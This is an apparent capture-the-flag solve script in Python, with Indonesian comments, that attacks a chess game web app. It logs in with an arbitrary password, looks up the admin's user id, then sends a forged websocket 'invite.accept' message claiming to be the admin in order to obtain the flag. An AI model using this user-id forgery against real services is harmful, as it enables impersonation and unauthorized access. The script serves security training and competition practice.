# solve_chess.py
import json
import secrets
import requests
import websocket

U = "http://7cde7b06-5d0b-4264-a5b5-3c6b5e25d370.inst.thryvectf.org"

def rid():
    return "req_" + secrets.token_hex(12)

s = requests.Session()

# 1) login: password bebas dari hasilmu
r = s.post(
    U + "/api/login",
    json={"username": "player_01", "password": "x"},
)
print("[login]", r.status_code, r.text)
r.raise_for_status()

# 2) ambil admin profile/id
r = s.post(
    U + "/api/profile",
    json={"username": "admin"},
)
print("[admin profile]", r.status_code, r.text)
admin_id = r.json()["profile"]["id"]
print("[+] admin_id =", admin_id)

# 3) buka websocket dengan cookie session
cookie_header = "; ".join(f"{c.name}={c.value}" for c in s.cookies)
ws_url = U.replace("http://", "ws://").replace("https://", "wss://") + "/ws"
print("[+] ws =", ws_url)
print("[+] cookie =", cookie_header)

ws = websocket.create_connection(
    ws_url,
    header=[f"Cookie: {cookie_header}"],
)

# baca session.ready / event awal
try:
    msg = ws.recv()
    print("[ws recv]", msg)
except Exception as e:
    print("[!] initial recv error:", e)

# 4) kirim invite ke admin
payload = {
    "type": "invite.send",
    "request_id": rid(),
    "to_user_id": admin_id,
}
print("[ws send]", payload)
ws.send(json.dumps(payload))

invite_id = None

# 5) tunggu invite.created
while True:
    raw = ws.recv()
    print("[ws recv]", raw)
    msg = json.loads(raw)

    if msg.get("type") == "invite.created":
        invite = msg.get("invite", {})
        invite_id = invite.get("invite_id")
        print("[+] invite_id =", invite_id)
        break

    if msg.get("type") == "error":
        print("[!] error before accept")
        break

if not invite_id:
    raise SystemExit("[-] no invite_id")

# 6) forge accept sebagai admin
payload = {
    "type": "invite.accept",
    "request_id": rid(),
    "invite_id": invite_id,
    "accepting_user_id": admin_id,
}
print("[ws send forged accept]", payload)
ws.send(json.dumps(payload))

# 7) baca event match / flag
for _ in range(10):
    raw = ws.recv()
    print("[ws recv]", raw)
    msg = json.loads(raw)

    if msg.get("type") == "flag.awarded":
        print("[FLAG EVENT]", msg.get("flag"))

# 8) fallback: cek /api/flag
r = s.get(U + "/api/flag")
print("[/api/flag]", r.status_code, r.text)
